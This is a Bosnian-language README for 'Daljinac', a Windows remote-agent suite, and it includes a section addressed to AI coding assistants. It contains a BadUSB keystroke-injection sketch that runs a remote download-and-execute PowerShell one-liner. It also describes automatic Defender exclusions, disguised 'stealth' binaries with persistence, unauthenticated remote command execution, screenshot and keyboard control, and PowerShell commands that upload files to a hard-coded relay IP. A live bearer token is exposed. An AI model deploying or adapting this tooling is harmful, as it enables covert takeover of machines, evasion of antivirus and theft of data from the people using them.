# Daljinac — Remote Windows Agent Suite

Dva agenta (v1 i v2) za potpuno daljinsko upravljanje Windows mašinama. V1 je REST API, V2 je MCP server. Oba se instaliraju sa **jednim one-linerom** preko `daljinac-pack`.

---

## Za AI asistente (OpenCode, Hermes, Claude Code, itd.)

Ako čitaš ovo, korisnik te uputio ovdje da razumiješ kako daljinac funkcioniše. Svaki detalj je dokumentovan ispod. Ako nešto ne radi na mašini, prvo provjeri:

1. Da li su procesi živi (`Get-Process sysui,sysagent`)
2. Da li SSH tunel radi (`curl localhost:708X/api/info`)
3. Da li Defender blokira (samo ako je novi install)

---

## Arhitektura

```
Windows Mašina                    VPS (31.220.74.109)              RPi (kontrolni centar)
┌─────────────────────┐           ┌──────────────────┐           ┌──────────────────────┐
│ v1: sysui.exe       │──SSH-R──→│ port 7081-7085    │←──SSH-L──│ localhost:7081        │
│     REST API :8081  │           │                  │           │                      │
│ v2: sysagent.exe    │──SSH-R──→│ port 7181-7200    │←──SSH-L──│ localhost:7181-7200   │
│     MCP server :1984│           │                  │           │                      │
│                     │           │ Relay :9999       │           │ dalj CLI             │
│ Tailscale (opciono) │           │ (file transfer)   │           │ v1transfer           │
└─────────────────────┘           └──────────────────┘           └──────────────────────┘
```

- **SSH-R**: Reverse tunnel (Windows → VPS). Agent inicira SSH konekciju ka VPS-u i otvara port za dolazne veze.
- **SSH-L**: Local forward (RPi → VPS). RPi forward-uje localhost portove ka VPS-u da ih vidi lokalno.
- **Tailscale**: Opciona direktna P2P konekcija (samo v2, samo neke mašine).

---

## Dva agenta — poređenje

| | v1 (sysui.exe) | v2 (sysagent.exe) |
|---|---|---|
| **Tip** | REST API HTTP server | MCP Streamable HTTP server |
| **Port** | 8081 | 1984 |
| **Auth** | Nema (otvoreni endpointi) | Bearer token `234d130007706cd69359c94b89d3dd70` |
| **SSH tunnel** | Portovi 7081-7100 (mapirani po hostname-u) | Portovi 7181-7200 (daemon-assigned) |
| **Tailscale** | Ne | Da, ako je dostupno (100.x.x.x:1984) |
| **Tray** | Da (opciono, `-notray` gasi) | Da (opciono, `-notray` gasi) |
| **Update** | `/api/update` (POST) | `/api/update` (POST, od v2.0.0-dev.20260719.4) |
| **File transfer** | `/api/ps` + Invoke-WebRequest → VPS relay | `/api/ps` + Invoke-WebRequest → VPS relay |
| **Dependencies** | Samo Go stdlib + crypto fork (256KB SSH) | Go stdlib + mcp-go + gopsutil + screenshots |
| **Binary size** | ~7.5MB | ~11MB |
| **Verzija** | 2.6.32 | 2.0.0-dev.20260719.4 |

---

## Instalacija

### Jedan one-liner (instalira oba agenta)

```powershell
iex (irm https://raw.githubusercontent.com/egzakutacno/daljinac-pack/main/install.ps1)
```

Ovo instalira oba agenta u `-notray` modu (bez tray ikonice):
- **v1**: `C:\appdata\sh\sysui.exe` (port 8081)
- **v2**: `C:\appdata\sa\sysagent.exe` (port 1984)

Scheduled taskovi: `sysui` / `sysuiWatch`, `sysagent` / `sysagentWatch` (ONLOGON + watchdog svakih 5 min).

### Samo jedan agent

```powershell
# Samo v1
iex "& { $(irm https://raw.githubusercontent.com/egzakutacno/daljinac-pack/main/install.ps1) } -v2:$false"
# Samo v2
iex "& { $(irm https://raw.githubusercontent.com/egzakutacno/daljinac-pack/main/install.ps1) } -v1:$false"
```

### DigiSpark BadUSB (automatska instalacija)

Arduino skripta koja kroz DigiKeyboard utipkava PowerShell komandu:

```cpp
#include "DigiKeyboard.h"
void setup() {}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("powershell iex (irm https://raw.githubusercontent.com/egzakutacno/daljinac-pack/main/install.ps1)");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  for (;;) {}
}
```

### Defender

`install.ps1` automatski dodaje `C:\appdata` u Defender exclusion listu (`Add-MpPreference -ExclusionPath`). Ako Defender ipak blokira (novi hash), rebuild-uj binary za novi hash.

---

## Port mappings (trenutne mašine)

V1 portovi (hardcodirani u `tunnel/ssh.go`):

| Port | Hostname | Alias |
|------|----------|-------|
| 7081 | DESKTOP-INJ3O0L | INJ3 (glavni PC) |
| 7082 | DESKTOP-S43UKD6 | S43 (Beelink) |
| 7083 | USERMIC-M3SII9L | USERMIC (poslovni) |
| 7084 | DESKTOP-BA967G1 | BA967G1 (Zoran) |
| 7085 | SANDOKAN | sandokan |

V2 portovi (dynamic, assigned by SSH daemon on VPS via `registerWithDaemon()`):

V2 agent se javlja VPS daemonu na portu 7199 (`curl http://127.0.0.1:7199/register?hostname=...`), koji mu dodjeljuje slobodan port u opsegu 7181-7200. Zato se portovi v2 mogu mijenjati između restart-ova.

---

## v1 REST API (port 8081 lokalno, port 7081-7085 kroz SSH tunel)

### Endpointi

| Endpoint | Metoda | Opis |
|----------|--------|------|
| `/api/info` | GET | Info o agentu (hostname, version, uptime) |
| `/api/status` | GET | Samo status i uptime |
| `/api/ps` | POST `{"command":"..."}` | Izvrši PowerShell komandu |
| `/api/execute` | POST `{"command":"..."}` | Izvrši CMD komandu |
| `/api/screenshot` | GET | Screenshot desktopa (PNG) |
| `/api/processes` | GET | Lista procesa |
| `/api/kill` | POST `{"pid":123}` | Ubij proces |
| `/api/files` | GET `?dir=PATH` | Lista fajlova u direktoriju |
| `/api/file_info` | GET `?path=PATH` | Info o fajlu (ime, veličina, modtime) |
| `/api/download` | GET `?path=PATH` | Preuzmi fajl (ceo u memoriju, max ~100MB) |
| `/api/upload` | POST `?path=PATH` | Upload fajl (raw body) |
| `/api/dlchunk` | GET `?path=PATH&offset=N&limit=N` | Streaming download chunk-a |
| `/api/upchunk` | POST `?path=PATH&offset=N` | Streaming upload chunk-a |
| `/api/update` | POST | Pokreni self-update (download sa GitHub releases) |
| `/api/youtube` | POST `{"query":"..."}` | Otvori YouTube search u browseru |

### Primjeri

```bash
# Screenshot
curl -s "http://localhost:7081/api/screenshot" -o screen.png

# PowerShell komanda
curl -s -X POST "http://localhost:7082/api/ps" \
  -H "Content-Type: application/json" \
  -d '{"command":"Get-Process\|Select-Object Id,ProcessName"}'

# Update agenta
curl -X POST "http://localhost:7081/api/update"

# File transfer (preko VPS relay)
curl -s -X POST "http://localhost:7081/api/ps" -H "Content-Type: application/json" \
  -d '{"command":"$b=[IO.File]::ReadAllBytes(\"C:\\fajl.exe\");IWR http://31.220.74.109:9999/f.exe -M POST -B $b -CT application/octet-stream"}'
```

**VAŽNO**: `/api/ps` komande se izvršavaju kao PowerShell, ne CMD. Koristi backslash `\\` za putanje unutar JSON-a. Output dolazi u `stdout` i `stderr` (CLIXML filter). Ako output nije JSON, agent je offline ili se tunel restartuje.

---

## v2 MCP API (port 1984 lokalno, port 7181-7200 kroz SSH tunel)

### Auth

Bearer token: `234d130007706cd69359c94b89d3dd70`

### MCP Handshake

Svaki zahtjev zahtijeva session:
1. `POST /mcp` sa `initialize` metodom
2. Server vraća `Mcp-Session-Id` header
3. Svi naredni requesti nose `Mcp-Session-Id` header

```bash
INIT=$(curl -s -D - http://localhost:7182/mcp \
  -H "Authorization: Bearer 234d130007706cd69359c94b89d3dd70" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"cli","version":"1.0"}}}')
SESSION=$(echo "$INIT" | grep -i "mcp-session-id:" | awk '{print $2}' | tr -d '\r')

curl -s http://localhost:7182/mcp \
  -H "Authorization: Bearer 234d130007706cd69359c94b89d3dd70" \
  -H "Content-Type: application/json" \
  -H "Mcp-Session-Id: $SESSION" \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"shell","arguments":{"command":"hostname","timeout":10}}}'
```

### Toolovi (18)

#### Screen & Display
- `get_screen_size` — rezolucija monitora
- `num_monitors` — broj monitora
- `screenshot` — PNG/JPEG screenshot (opcije: monitor, max_width, quality, format)
- `screenshot_base64` — base64 data URI (za inline prikaz)

#### Mouse
- `mouse_move(x, y)` — pomjeri kursor
- `mouse_click(x, y, button, click_type)` — klik (left/right/middle, single/double)
- `mouse_scroll(x, y, delta_x, delta_y)` — scroll
- `mouse_drag(from_x, from_y, to_x, to_y)` — drag

#### Keyboard
- `keyboard_type(text)` — ukucaj tekst (Unicode)
- `keyboard_hotkey(keys)` — kombinacija tastera (ctrl, alt, shift, win, a-z, f1-f12, enter, itd.)

#### Shell
- `shell(command, timeout)` — PowerShell/CMD komanda. Auto-detektuje tip. Vraća exit code, stdout, stderr.

#### Files
- `file_read(path, encoding)` — čitanje fajla (text do 500KB, base64 do 10MB)
- `file_write(path, content)` — pisanje fajla
- `file_list(dir)` — listing direktorijuma

#### System
- `processes` — lista procesa
- `clipboard_get` / `clipboard_set(text)` — clipboard
- `window_list` — lista otvorenih prozora

### Native shell (od v2.0.0-dev.20260719.4)

Za komande tipa `whoami`, `ipconfig`, `netstat`, `hostname` — v2 pokušava direktno pozvati executable (`CreateProcessW`) bez `cmd.exe` posrednika. PowerShell cmdlet-i (`Get-Process`, `Stop-Service`) automatski idu kroz PowerShell. CMD built-in komande (`dir`, `copy`, `del`) idu kroz cmd. Fallback na stari metod ako direktni poziv fail-uje.

---

## File Transfer (VPS Relay)

Za transfere veće od 1MB koristimo VPS relay server (31.220.74.109:9999). Ne koristimo SSH tunel za file transfer.

### Arhitektura

```
Source Machine ──POST──→ VPS:9999/ime_fajla ──GET──→ Target Machine
                         (privremeno skladište)
```

### Kako koristiti

**Upload** (sa izvorne mašine):
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\source\file.exe")
Invoke-WebRequest -Uri http://31.220.74.109:9999/file.exe `
  -Method POST -Body $bytes -ContentType "application/octet-stream"
```

**Download** (na ciljnu mašinu):
```powershell
Invoke-WebRequest -Uri http://31.220.74.109:9999/file.exe `
  -OutFile "C:\target\file.exe" -UseBasicParsing
```

**Kroz daljinac v1 (preko /api/ps):**
```bash
# Upload
curl -X POST "http://localhost:7081/api/ps" -H "Content-Type: application/json" \
  -d '{"command":"$b=[IO.File]::ReadAllBytes(\"C:\\file.exe\");IWR http://31.220.74.109:9999/file.exe -M POST -B $b -CT application/octet-stream"}'

# Download
curl -X POST "http://localhost:7082/api/ps" -H "Content-Type: application/json" \
  -d '{"command":"IWR http://31.220.74.109:9999/file.exe -OutFile C:\\file.exe -UseBasicParsing"}'
```

**Brisanje nakon transfera:**
```bash
curl -X DELETE http://31.220.74.109:9999/file.exe
```

### Relay server

Script: `/home/ruter/projekti/daljinac-pack/relay.py` (takođe na GitHub-u)
Location: VPS `/tmp/vps-relay.py`
Start: `@reboot` cronjob, port 9999
Fast: ~8-12 MB/s (INJ3), 4-6 MB/s (Beelink kroz VPN)

**Brzi test da li relay radi:**
```bash
curl -s -o /dev/null -w "%{http_code}" http://31.220.74.109:9999/test
```
Vraća 404 = radi.

---

## Struktura fajlova na Windows mašini

### Normalna instalacija (sa tray)
```
C:\daljinac\
├── systemUI.exe       # v1 binary
├── watchdog.vbs
├── daljinac.log
└── .ssh\              # SSH ključ za reverse tunnel

C:\daljinac2\
├── daljinac2.exe      # v2 binary
├── watchdog.vbs
├── daljinac2.log
└── .ssh\
```

### Notray instalacija (default)
```
C:\appdata\
├── sh\                # v1
│   ├── sysui.exe
│   ├── watchdog.vbs
│   ├── sysui.log
│   └── .ssh\
└── sa\                # v2
    ├── sysagent.exe
    ├── watchdog.vbs
    ├── sysagent.log
    └── .ssh\
```

### Scheduled Tasks
```
sysui              → C:\appdata\sh\sysui.exe -notray  (ONLOGON, HIGHEST)
sysuiWatch         → wscript.exe watchdog.vbs         (svakih 5 min)

sysagent           → C:\appdata\sa\sysagent.exe -notray (ONLOGON, HIGHEST)
sysagentWatch      → wscript.exe watchdog.vbs           (svakih 5 min)
```

---

## GitHub repozitoriji

| Repo | Opis | Latest release |
|------|------|---------------|
| [egzakutacno/daljinac](https://github.com/egzakutacno/daljinac) | v1 source + binary | `systemUI.exe` |
| [egzakutacno/daljinac2](https://github.com/egzakutacno/daljinac2) | v2 source + binary | `daljinac2.exe` |
| [egzakutacno/daljinac-pack](https://github.com/egzakutacno/daljinac-pack) | Univerzalni installer + relay | `install.ps1` |

---

## Poznati problemi

### SSH tunel puca na velikim POST request-ovima
- Ne koristiti upchunk/dlchunk za fajlove >1MB
- Koristiti VPS relay za sve transfere

### Defender flag-uje novi hash
- `Add-MpPreference -ExclusionPath "C:\appdata"` (dodaje ga installer)
- Ako i dalje blokira → rebuild binary za novi hash → upload na GitHub

### Ghost tray ikone (unresponsive)
- `Stop-Process -Name explorer -Force; Start-Process explorer` restartuje Explorer
- Ili jednostavno ignoriši — agent radi i bez responsive ikone

### V2 SSH tunnel port mijenja se između restart-ova
- Skeniraj portove 7181-7200: `for p in $(seq 7181 7200); do curl ... localhost:$p/api/info; done`
- Ili koristi `/health` endpoint: `curl localhost:718X/health`

### Tailscale IP za INJ3 se povremeno mijenja
- Aktuelni IP provjeri sa: `tailscale status | grep inj3`
- Tailscale nije dostupan na svim mašinama (samo INJ3)

### V1 log file lokacija
- Log je u istom folderu kao i binary: `$exeDir\$baseName.log`
- Za stealth instalaciju: `C:\appdata\sh\sysui.log`

---

## Brza dijagnostika

```bash
# 1. Koje v1 mašine su online?
for p in 7081 7082 7083 7084 7085; do
  echo -n "$p: "; curl -s --connect-timeout 2 "http://localhost:$p/api/info" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['hostname'],d['version'])" 2>/dev/null || echo "OFFLINE"
done

# 2. Koje v2 mašine su online?
for p in $(seq 7181 7200); do
  r=$(curl -s --connect-timeout 1 "http://localhost:$p/health" 2>/dev/null)
  [ -n "$r" ] && echo "port $p: $r"
done

# 3. Da li relay radi?
curl -s -o /dev/null -w "%{http_code}" http://31.220.74.109:9999/test
```

---

## Update protokol

**v1 i v2** — oba imaju `/api/update` endpoint (POST):

```bash
curl -X POST "http://localhost:7081/api/update"  # v1
curl -X POST "http://localhost:7185/api/update"  # v2
```

Agent skida najnoviji binary sa GitHub releases, zamjenjuje trenutni, restartuje se kroz scheduled task. Nema potrebe za reinstalacijom ili one-linerom.

**VAŽNO**: v2 `/api/update` dodan u verziji 2.0.0-dev.20260719.4. Starije verzije nemaju ovaj endpoint.

---

## Update-ovanje jednog agenta kroz drugog

Ako v1 radi a v2 treba update, koristi v1:

```bash
# 1. Upload novog v2 binary-a na mašinu (sa RPi-ja, kroz SSH tunel):
#    (ili koristi VPS relay)

# 2. Kill v2, zamijeni binary, startuj novi:
curl -X POST "http://localhost:7081/api/ps" -H "Content-Type: application/json" \
  -d '{"command":"Get-Process sysagent -ErrorAction SilentlyContinue\|Stop-Process -Force; Start-Sleep 2; Start-Process C:\\appdata\\sa\\sysagent.exe -ArgumentList \"-notray\""}' 
```

---

## SSH ključevi

Oba agenta koriste **iste** SSH ključeve za reverse tunnel ka VPS-u. Ključevi su hardcodirani u `tunnel/ssh.go` i čuvaju se u `$exeDir\.ssh\id_daljinac` (odnosno `id_daljinac2`).

RPi koristi `~/.ssh/daljinac_key` za direktan SSH pristup VPS-u (za deploy relay-a i administraciju).

---

## Verzije (posljednje stabilne)

| Agent | Verzija | Datum |
|-------|---------|-------|
| v1 | 2.6.32 | Jul 2026 |
| v2 | 2.0.0-dev.20260719.4 | Jul 2026 |

**Ključne promjene u posljednjim verzijama:**
- Location-agnostic (binary derivira putanje iz sopstvene lokacije)
- `/api/update` endpoint na v2
- Native shell (direktno CreateProcessW, nema cmd wrapper-a)
- VPS relay za file transfer
- Defender exclusion automatski
